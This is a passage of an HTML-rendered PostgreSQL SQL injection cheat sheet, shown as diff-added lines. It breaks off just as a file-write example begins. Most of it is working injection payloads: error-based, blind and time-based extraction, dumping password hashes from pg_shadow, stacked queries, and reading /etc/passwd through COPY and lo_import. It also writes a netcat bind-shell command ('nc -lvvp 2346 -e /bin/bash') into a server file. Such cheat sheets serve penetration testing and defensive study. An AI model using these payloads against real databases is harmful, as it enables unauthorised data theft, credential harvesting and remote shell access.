+        <li class="md-nav__item">
+  <a href="#postgresql-command-execution" class="md-nav__link">
+    PostgreSQL Command execution
+  </a>
+  
+    <nav class="md-nav" aria-label="PostgreSQL Command execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-20199193" class="md-nav__link">
+    CVE-2019–9193
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-libcso6" class="md-nav__link">
+    Using libc.so.6
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-filter" class="md-nav__link">
+    Bypass Filter
+  </a>
+  
+    <nav class="md-nav" aria-label="Bypass Filter">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#quotes" class="md-nav__link">
+    Quotes
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="postgresql-injection">PostgreSQL injection</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#postgresql-comments">PostgreSQL Comments</a></li>
+<li><a href="#postgresql-version">PostgreSQL version</a></li>
+<li><a href="#postgresql-current-user">PostgreSQL Current User</a></li>
+<li><a href="#postgresql-list-users">PostgreSQL List Users</a></li>
+<li><a href="#postgresql-list-password-hashes">PostgreSQL List Password Hashes</a></li>
+<li><a href="#postgresql-list-database-administrator-accounts">PostgreSQL List Database Administrator Accounts</a></li>
+<li><a href="#postgresql-list-privileges">PostgreSQL List Privileges</a></li>
+<li><a href="#postgresql-check-if-current-user-is-superuser">PostgreSQL Check if Current User is Superuser</a></li>
+<li><a href="#postgresql-database-name">PostgreSQL database name</a></li>
+<li><a href="#postgresql-list-database">PostgreSQL List databases</a></li>
+<li><a href="#postgresql-list-tables">PostgreSQL List tables</a></li>
+<li><a href="#postgresql-list-columns">PostgreSQL List columns</a></li>
+<li><a href="#postgresql-error-based">PostgreSQL Error Based</a></li>
+<li><a href="#postgresql-xml-helpers">PostgreSQL XML Helpers</a></li>
+<li><a href="#postgresql-blind">PostgreSQL Blind</a></li>
+<li><a href="#postgresql-time-based">PostgreSQL Time Based</a></li>
+<li><a href="#postgresql-stacked-query">PostgreSQL Stacked query</a></li>
+<li><a href="#postgresql-file-read">PostgreSQL File Read</a></li>
+<li><a href="#postgresql-file-write">PostgreSQL File Write</a></li>
+<li><a href="#postgresql-command-execution">PostgreSQL Command execution</a><ul>
+<li><a href="#cve-20199193">CVE-2019–9193</a></li>
+<li><a href="#using-libcso6">Using libc.so.6</a></li>
+</ul>
+</li>
+<li><a href="#bypass-filter">Bypass Filter</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="postgresql-comments">PostgreSQL Comments</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">--</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="cm">/**/</span><span class="w">  </span>
+</code></pre></div>
+<h2 id="postgresql-chain-injection-points-symbols">PostgreSQL chain injection points symbols</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">;</span><span class="w"> </span><span class="o">#</span><span class="n">Used</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">terminate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">command</span><span class="p">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="k">only</span><span class="w"> </span><span class="n">place</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">within</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">statement</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">within</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="n">constant</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">quoted</span><span class="w"> </span><span class="n">identifier</span><span class="p">.</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="o">||</span><span class="w"> </span><span class="o">#</span><span class="k">or</span><span class="w"> </span><span class="k">statement</span><span class="w"> </span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="o">#</span><span class="w"> </span><span class="k">usage</span><span class="w"> </span><span class="n">examples</span><span class="p">:</span><span class="w"> </span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="o">/?</span><span class="n">whatever</span><span class="o">=</span><span class="mi">1</span><span class="p">;(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="o">/?</span><span class="n">whatever</span><span class="o">=</span><span class="mi">1</span><span class="o">||</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
+</code></pre></div>
+<h2 id="postgresql-version">PostgreSQL Version</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="postgresql-current-user">PostgreSQL Current User</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">;</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">current_user</span><span class="p">;</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">session_user</span><span class="p">;</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">usename</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_user</span><span class="p">;</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">getpgusername</span><span class="p">();</span>
+</code></pre></div>
+<h2 id="postgresql-list-users">PostgreSQL List Users</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">usename</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_user</span>
+</code></pre></div>
+<h2 id="postgresql-list-password-hashes">PostgreSQL List Password Hashes</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">usename</span><span class="p">,</span><span class="w"> </span><span class="n">passwd</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_shadow</span><span class="w"> </span>
+</code></pre></div>
+<h2 id="postgresql-list-database-administrator-accounts">PostgreSQL List Database Administrator Accounts</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">usename</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_user</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">usesuper</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="k">TRUE</span>
+</code></pre></div>
+<h2 id="postgresql-list-privileges">PostgreSQL List Privileges</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">usename</span><span class="p">,</span><span class="w"> </span><span class="n">usecreatedb</span><span class="p">,</span><span class="w"> </span><span class="n">usesuper</span><span class="p">,</span><span class="w"> </span><span class="n">usecatupd</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_user</span>
+</code></pre></div>
+<h2 id="postgresql-check-if-current-user-is-superuser">PostgreSQL Check if Current User is Superuser</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">SHOW</span><span class="w"> </span><span class="n">is_superuser</span><span class="p">;</span><span class="w"> </span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">current_setting</span><span class="p">(</span><span class="s1">&#39;is_superuser&#39;</span><span class="p">);</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">usesuper</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_user</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">usename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">CURRENT_USER</span><span class="p">;</span>
+</code></pre></div>
+<h2 id="postgresql-database-name">PostgreSQL Database Name</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">current_database</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="postgresql-list-database">PostgreSQL List Database</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">datname</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_database</span>
+</code></pre></div>
+<h2 id="postgresql-list-tables">PostgreSQL List Tables</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>
+</code></pre></div>
+<h2 id="postgresql-list-columns">PostgreSQL List Columns</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;data_table&#39;</span>
+</code></pre></div>
+<h2 id="postgresql-error-based">PostgreSQL Error Based</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">,</span><span class="k">cAsT</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="mi">126</span><span class="p">)</span><span class="o">||</span><span class="k">vErSiOn</span><span class="p">()</span><span class="o">||</span><span class="n">chr</span><span class="p">(</span><span class="mi">126</span><span class="p">)</span><span class="o">+</span><span class="k">aS</span><span class="o">+</span><span class="nb">nUmeRiC</span><span class="p">)</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="p">,</span><span class="k">cAsT</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="mi">126</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="k">sEleCt</span><span class="o">+</span><span class="k">table_name</span><span class="o">+</span><span class="k">fRoM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="o">+</span><span class="k">lImIt</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="k">offset</span><span class="o">+</span><span class="n">data_offset</span><span class="p">)</span><span class="o">||</span><span class="n">chr</span><span class="p">(</span><span class="mi">126</span><span class="p">)</span><span class="o">+</span><span class="k">as</span><span class="o">+</span><span class="nb">nUmeRiC</span><span class="p">)</span><span class="c1">--</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="p">,</span><span class="k">cAsT</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="mi">126</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="k">sEleCt</span><span class="o">+</span><span class="k">column_name</span><span class="o">+</span><span class="k">fRoM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="o">+</span><span class="k">wHerE</span><span class="o">+</span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;data_table&#39;</span><span class="o">+</span><span class="k">lImIt</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="k">offset</span><span class="o">+</span><span class="n">data_offset</span><span class="p">)</span><span class="o">||</span><span class="n">chr</span><span class="p">(</span><span class="mi">126</span><span class="p">)</span><span class="o">+</span><span class="k">as</span><span class="o">+</span><span class="nb">nUmeRiC</span><span class="p">)</span><span class="c1">--</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="p">,</span><span class="k">cAsT</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="mi">126</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="k">sEleCt</span><span class="o">+</span><span class="n">data_column</span><span class="o">+</span><span class="k">fRoM</span><span class="o">+</span><span class="n">data_table</span><span class="o">+</span><span class="k">lImIt</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="k">offset</span><span class="o">+</span><span class="n">data_offset</span><span class="p">)</span><span class="o">||</span><span class="n">chr</span><span class="p">(</span><span class="mi">126</span><span class="p">)</span><span class="o">+</span><span class="k">as</span><span class="o">+</span><span class="nb">nUmeRiC</span><span class="p">)</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="s1">&#39; and 1=cast((SELECT concat(&#39;</span><span class="k">DATABASE</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;,current_database())) as int) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="s1">&#39; and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="s1">&#39; and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;</span><span class="n">data_table</span><span class="s1">&#39; LIMIT 1 OFFSET data_offset) as int) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="s1">&#39; and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+</code></pre></div>
+<h2 id="postgresql-xml-helpers">PostgreSQL XML helpers</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="k">select</span><span class="w"> </span><span class="n">query_to_xml</span><span class="p">(</span><span class="s1">&#39;select * from pg_user&#39;</span><span class="p">,</span><span class="k">true</span><span class="p">,</span><span class="k">true</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">-- returns all the results as a single xml row</span>
+</code></pre></div>
+<p>The <code>query_to_xml</code> above returns all the results of the specified query as a single result. Chain this with the <a href="#postgresql-error-based">PostgreSQL Error Based</a> technique to exfiltrate data without having to worry about <code>LIMIT</code>ing your query to one result.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">select</span><span class="w"> </span><span class="n">database_to_xml</span><span class="p">(</span><span class="k">true</span><span class="p">,</span><span class="k">true</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">-- dump the current database to XML</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="k">select</span><span class="w"> </span><span class="n">database_to_xmlschema</span><span class="p">(</span><span class="k">true</span><span class="p">,</span><span class="k">true</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">-- dump the current db to an XML schema</span>
+</code></pre></div>
+<p>Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.</p>
+<h2 id="postgresql-blind">PostgreSQL Blind</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="s1">&#39; and substr(version(),1,10) = &#39;</span><span class="n">PostgreSQL</span><span class="s1">&#39; and &#39;</span><span class="mi">1</span><span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">OK</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="s1">&#39; and substr(version(),1,10) = &#39;</span><span class="n">PostgreXXX</span><span class="s1">&#39; and &#39;</span><span class="mi">1</span><span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">KO</span>
+</code></pre></div>
+<h2 id="postgresql-time-based">PostgreSQL Time Based</h2>
+<h4 id="identify-time-based">Identify time based</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="p">;(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="o">||</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
+</code></pre></div>
+<h4 id="database-dump-time-based">Database dump time based</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="k">select</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="n">datname</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">pg_database</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+<h4 id="table-dump-time-based">Table dump time based</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">select</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">table_name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+<h4 id="columns-dump-time-based">columns dump time based</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="k">select</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">column</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="k">select</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="k">column</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">column_name</span><span class="o">=</span><span class="s1">&#39;value&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="k">AND</span><span class="w"> </span><span class="p">[</span><span class="n">RANDNUM</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="p">[</span><span class="n">RANDNUM</span><span class="p">]</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PG_SLEEP</span><span class="p">([</span><span class="n">SLEEPTIME</span><span class="p">]))</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="k">AND</span><span class="w"> </span><span class="p">[</span><span class="n">RANDNUM</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">GENERATE_SERIES</span><span class="p">(</span><span class="mi">1</span><span class="p">,[</span><span class="n">SLEEPTIME</span><span class="p">]</span><span class="mi">000000</span><span class="p">))</span>
+</code></pre></div>
+<h2 id="postgresql-stacked-query">PostgreSQL Stacked Query</h2>
+<p>Use a semi-colon ";" to add another query</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="k">host</span><span class="o">/</span><span class="n">vuln</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="n">injection</span><span class="err">&#39;</span><span class="p">;</span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">NotSoSecure</span><span class="w"> </span><span class="p">(</span><span class="k">data</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">200</span><span class="p">));</span><span class="c1">--</span>
+</code></pre></div>
+<h2 id="postgresql-file-read">PostgreSQL File Read</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">select</span><span class="w"> </span><span class="n">pg_ls_dir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="k">select</span><span class="w"> </span><span class="n">pg_read_file</span><span class="p">(</span><span class="s1">&#39;PG_VERSION&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">200</span><span class="p">);</span>
+</code></pre></div>
+<p>NOTE: Earlier versions of Postgres did not accept absolute paths in <code>pg_read_file</code> or <code>pg_ls_dir</code>. Newer versions (as of <a href="https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a">this</a> commit) will allow reading any file/filepath for super users or users in the <code>default_role_read_server_files</code> group.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">temp</span><span class="p">(</span><span class="n">t</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">);</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="k">COPY</span><span class="w"> </span><span class="n">temp</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">;</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">temp</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">offset</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">lo_import</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">-- will create a large object from the file and return the OID</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">lo_get</span><span class="p">(</span><span class="mi">16420</span><span class="p">);</span><span class="w"> </span><span class="c1">-- use the OID returned from the above</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">pg_largeobject</span><span class="p">;</span><span class="w"> </span><span class="c1">-- or just get all the large objects and their data</span>
+</code></pre></div>
+<h2 id="postgresql-file-write">PostgreSQL File Write</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">pentestlab</span><span class="w"> </span><span class="p">(</span><span class="n">t</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">);</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">pentestlab</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="p">(</span><span class="s1">&#39;nc -lvvp 2346 -e /bin/bash&#39;</span><span class="p">);</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pentestlab</span><span class="p">;</span>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="k">COPY</span><span class="w"> </span><span class="n">pentestlab</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;/tmp/pentestlab&#39;</span><span class="p">;</span>
+</code></pre></div>
+<p>Or as one line:
